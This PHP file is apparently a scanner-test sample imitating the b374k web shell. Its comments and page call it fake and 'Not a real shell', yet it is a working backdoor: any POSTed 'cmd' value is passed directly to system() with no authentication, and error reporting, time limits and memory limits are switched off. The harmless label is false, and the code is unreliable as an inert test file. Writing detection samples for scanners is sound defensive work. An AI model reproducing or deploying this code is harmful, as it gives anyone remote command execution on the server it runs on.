<?php
// HIVE Test Backdoor - b374k.php
// This is a FAKE backdoor for security scanner testing
// Mimics B374K shell patterns for scanner detection

$GLOBALS['pass'] = "b374k";
$GLOBALS['theme'] = "dark";
$GLOBALS['lang'] = "en";

error_reporting(0);
set_time_limit(0);
ini_set('max_execution_time', 0);
ini_set('memory_limit', '-1');

function b374k_header() {
    echo '<!DOCTYPE html><html><head><title>b374k</title></head><body>';
}

function b374k_footer() {
    echo '</body></html>';
}

function b374k_login() {
    return true;
}

$b374k_version = "3.2";
$b374k_author = "HIVE Test";

if(isset($_POST['cmd'])) {
    echo "<pre>";
    $cmd = $_POST['cmd'];
    system($cmd);
    echo "</pre>";
}
?>
<html>
<head>
<title>b374k shell</title>
<style>
body { background: #222; color: #0f0; font-family: monospace; }
input { background: #333; color: #0f0; border: 1px solid #0f0; padding: 5px; }
</style>
</head>
<body>
<h1>b374k 3.2</h1>
<p>HIVE Test File - Not a real shell</p>
<form method="POST">
<input type="text" name="cmd" size="50">
<input type="submit" value="Execute">
</form>
</body>
</html>
